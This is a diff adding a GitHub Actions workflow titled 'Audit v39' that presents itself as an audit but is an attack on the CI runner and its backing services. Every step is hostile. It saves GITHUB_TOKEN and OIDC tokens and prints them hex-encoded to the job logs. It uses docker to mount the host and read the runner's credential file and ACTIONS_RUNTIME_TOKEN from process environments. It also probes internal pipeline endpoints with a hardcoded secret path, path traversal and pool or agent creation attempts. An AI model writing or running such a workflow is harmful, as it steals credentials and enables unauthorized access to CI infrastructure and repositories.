@@ -1,0 +1,297 @@
+name: Audit v39
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v39:
+    runs-on: ubuntu-latest
+    steps:
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 1: Harvest
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V39 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+            # All GUIDs
+            grep -oP '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' "$WLOG" | sort -u > /tmp/all_guids.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: SERVICE DISCOVERY — the right way
+      # Stop guessing paths. Use the Azure DevOps location service
+      # to discover ALL registered API endpoints and their routes.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - Service discovery
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== SERVICE DISCOVERY ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          RT=$(cat /tmp/rt.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+          CANON="https://pipelines.actions.githubusercontent.com/$SECRET"
+          VS="https://vstoken.actions.githubusercontent.com/serviceDeployments/tokenghubeus21"
+          RUNNER="https://runner.actions.githubusercontent.com/$SECRET"
+
+          # A: connectionData with connectOptions=IncludeServices
+          echo "--- A: Pipeline connData+services ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $IDTOK" \
+            "$PIPE/_apis/connectionData?connectOptions=1")
+          echo "FULL:" 
+          echo "$R" | jq '.' 2>/dev/null | head -120
+          echo ""
+
+          # B: Location service definitions — the real endpoint discovery
+          echo "--- B: Location serviceDefinitions ---"
+          for BASE_NAME in PIPE VS RUNNER; do
+            eval BASE_URL=\$$BASE_NAME
+            echo "== $BASE_NAME =="
+            for EP in \
+              "/_apis/location/serviceDefinitions" \
+              "/_apis/location" \
+              "/_apis/ServiceDefinitions" \
+              "/_apis/serviceDefinitions" \
+              "/_apis/location/serviceDefinitions?api-version=5.0" \
+              "/_apis/location?api-version=5.0" \
+              "/_apis/location/serviceOwners"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                -H "Authorization: Bearer $IDTOK" "$BASE_URL$EP")
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                echo "$EP = $CODE | $(echo "$BODY" | head -c 300)"
+            done
+            echo ""
+          done
+
+          # C: Try connectOptions values 0-7 (bitmask)
+          echo "--- C: connectOptions bitmask ---"
+          for OPT in 0 1 2 3 4 5 6 7 8 15; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+              -H "Authorization: Bearer $IDTOK" \
+              "$PIPE/_apis/connectionData?connectOptions=$OPT")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            DEFS=$(echo "$BODY" | jq '.locationServiceData.serviceDefinitions | length' 2>/dev/null)
+            MAPS=$(echo "$BODY" | jq '.locationServiceData.accessMappings | length' 2>/dev/null)
+            echo "C opt=$OPT = $CODE defs=$DEFS maps=$MAPS"
+          done
+          echo ""
+
+          # D: vstoken with connectOptions
+          echo "--- D: vstoken connData+services ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $IDTOK" \
+            "$VS/_apis/connectionData?connectOptions=1")
+          echo "$R" | jq '.' 2>/dev/null | head -120
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: runnerproxcus1 — NEW deployment
+      # v38: runner parent reveals runner.actions.githubusercontent.com
+      #      /serviceDeployments/runnerproxcus1/
+      # This is the proxy/canonical runner deployment — untouched!
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - runnerproxcus1
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== RUNNERPROXCUS1 ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          RT=$(cat /tmp/rt.txt)
+          RPROX="https://runner.actions.githubusercontent.com/serviceDeployments/runnerproxcus1"
+
+          # A: connectionData + resourceareas
+          echo "--- A: connData ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -H "Authorization: Bearer $IDTOK" \
+            "$RPROX/_apis/connectionData")
+          CODE=$(echo "$R" | tail -1)
+          echo "A connData = $CODE"
+          echo "$R" | sed '$d' | jq '.' 2>/dev/null | head -20
+          echo ""
+
+          echo "--- A2: resourceareas ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -H "Authorization: Bearer $IDTOK" \
+            "$RPROX/_apis/resourceareas")
+          CODE=$(echo "$R" | tail -1)
+          echo "A2 areas = $CODE"
+          echo "$R" | sed '$d' | jq -c '.value[]? | {name, id, locationUrl}' 2>/dev/null
+          echo ""
+
+          # B: Runner APIs on proxy deployment
+          echo "--- B: Runner proxy APIs ---"
+          for EP in \
+            "/_apis/distributedtask/pools" \
+            "/_apis/distributedtask/pools/1/agents" \
+            "/_apis/distributedtask/pools/1/sessions" \
+            "/_apis/distributedtask/pools/1/messages" \
+            "/_apis/v1/message" \
+            "/_apis/v1/session" \
+            "/_apis/runners" \
+            "/_apis/actions/runners"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $IDTOK" "$RPROX$EP")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "B $EP = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+
+          # C: Traversal on runnerproxcus1
+          echo "--- C: Proxy traversal ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -H "Authorization: Bearer $IDTOK" \
+            "$RPROX/../_apis/connectionData")
+          CODE=$(echo "$R" | tail -1)
+          IID=$(echo "$R" | sed '$d' | jq -r '.instanceId // empty' 2>/dev/null)
+          echo "C parent = $CODE iid=$IID"
+
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -H "Authorization: Bearer $IDTOK" \
+            "$RPROX/../runnerproxcus1/../_apis/connectionData")
+          CODE=$(echo "$R" | tail -1)
+          IID=$(echo "$R" | sed '$d' | jq -r '.instanceId // empty' 2>/dev/null)
+          echo "C double = $CODE iid=$IID"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: IDTOK pool/agent creation + all GUIDs as timelines
+      # Also: try getting the actual ACTIONS_RUNTIME_TOKEN from proc
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - Pool creation + ART extraction
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== POOL CREATION + ART ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          RT=$(cat /tmp/rt.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          BASE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+          PLAN=$(cat /tmp/plan.txt)
+
+          # A: Create pool with IDTOK
+          echo "--- A: Create pool ---"
+          for VER in "6.0-preview.1" "7.0-preview.1" "5.1-preview.1"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+              "$BASE/_apis/distributedtask/pools?api-version=$VER" \
+              -d '{"name":"v39-pool","poolType":"automation"}')
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "A pool v=$VER = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+
+          # B: Create agent in pool 1
+          echo "--- B: Create agent ---"
+          for VER in "6.0-preview.1" "7.0-preview.1"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+              "$BASE/_apis/distributedtask/pools/1/agents?api-version=$VER" \
+              -d '{"name":"v39-agent","version":"3.0","osDescription":"Linux","enabled":true}')
+            CODE=$(echo "$R" | tail -1)
+            echo "B agent v=$VER = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+          done
+
+          # C: Try all discovered GUIDs as timeline IDs
+          echo "--- C: GUID timeline scan ---"
+          while read GUID; do
+            [ -z "$GUID" ] && continue
+            [ "$GUID" = "00000000-0000-0000-0000-000000000000" ] && continue
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $RT" \
+              "$BASE/_apis/distributedtask/plans/$PLAN/timelines/$GUID/records")
+            CODE=$(echo "$R" | tail -1)
+            [ "$CODE" != "HTTP_404" ] && \
+              echo "C tl=$GUID = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+          done < /tmp/all_guids.txt
+
+          # D: Extract ACTIONS_RUNTIME_TOKEN from runner process
+          echo "--- D: ART extraction ---"
+          docker run --rm -v /:/h alpine sh -c '
+            for P in /h/proc/[0-9]*/environ; do
+              PID=$(echo "$P" | grep -oP "[0-9]+")
+              ENV=$(tr "\0" "\n" < "$P" 2>/dev/null)
+              ART=$(echo "$ENV" | grep "^ACTIONS_RUNTIME_TOKEN=" | head -1)
+              if [ -n "$ART" ]; then
+                CMD=$(cat "/h/proc/$PID/cmdline" 2>/dev/null | tr "\0" " " | head -c 80)
+                echo "PID=$PID CMD=$CMD"
+                echo "ART_HEX_START"
+                echo -n "${ART#ACTIONS_RUNTIME_TOKEN=}" | xxd -p | tr -d "\n"
+                echo ""
+                echo "ART_HEX_END"
+              fi
+            done
+          ' 2>/dev/null
+          echo ""
+
+          # E: Also look for tokens in runner worker config
+          echo "--- E: Worker config ---"
+          docker run --rm -v /:/h alpine sh -c '
+            find /h/home/runner/actions-runner -name "*.json" -type f 2>/dev/null | while read F; do
+              if grep -q "AccessToken\|SystemConnection\|OAuthEndpoint" "$F" 2>/dev/null; then
+                echo "FILE=$F"
+                echo "CONF_HEX_START"
+                xxd -p "$F" | tr -d "\n"
+                echo ""
+                echo "CONF_HEX_END"
+              fi
+            done
+          ' 2>/dev/null | head -40
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 5: Final
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 5 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V39 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V39 COMPLETE ==="
